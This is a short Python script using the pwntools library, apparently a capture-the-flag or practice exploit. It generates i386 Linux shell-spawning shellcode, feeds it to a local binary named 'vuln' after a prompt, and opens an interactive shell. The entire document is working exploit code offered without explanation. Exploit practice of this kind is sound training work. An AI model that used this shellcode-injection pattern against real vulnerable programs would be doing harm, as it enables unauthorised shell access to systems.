from pwn import *

print shellcraft.i386.linux.sh()
sh = process('vuln')
sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
sh.interactive()
